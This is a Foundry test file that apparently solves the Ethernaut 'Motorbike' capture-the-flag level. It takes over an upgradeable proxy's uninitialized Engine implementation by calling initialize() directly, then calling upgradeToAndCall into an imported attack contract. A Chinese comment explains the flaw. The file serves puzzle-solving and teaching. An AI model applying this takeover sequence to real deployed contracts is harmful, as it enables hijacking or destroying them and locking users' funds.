// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Motorbike, Engine, EngineAttack} from "../src/Motorbike.sol";

/*
function createInstance(address _player) public payable override returns (address) {
    _player;

    Engine engine = new Engine();
    Motorbike motorbike = new Motorbike(address(engine));
    engines[address(motorbike)] = address(engine);

    require(
        keccak256(Address.functionCall(address(motorbike), abi.encodeWithSignature("upgrader()")))
            == keccak256(abi.encode(address(this))),
        "Wrong upgrader address"
    );

    require(
        keccak256(Address.functionCall(address(motorbike), abi.encodeWithSignature("horsePower()")))
            == keccak256(abi.encode(uint256(1000))),
        "Wrong horsePower"
    );

    return address(motorbike);
}
*/

/*
Motorbike的构造函数中是delegatecall调用Engine的initializer函数
Engine实际没有initialize
*/

contract MotorbikeTest is Test {
    function testMotorbike() public {
        Motorbike motor = Motorbike(0x43D480f9A4e9ad79d8F130212766e896D9554aa0);
        Engine engine = Engine(0x19A6452406F5934a919feB306197D71e4BCBEc15);
        EngineAttack attack = new EngineAttack();

        address player = makeAddr("player");
        console.log("player %s attack %s", player, address(attack));

        vm.startPrank(player, player);
        engine.initialize();
        engine.upgradeToAndCall(address(attack), abi.encodeWithSelector(EngineAttack.run.selector));
        vm.stopPrank();

        console.log("engine upgrader %s", engine.upgrader());
    }
}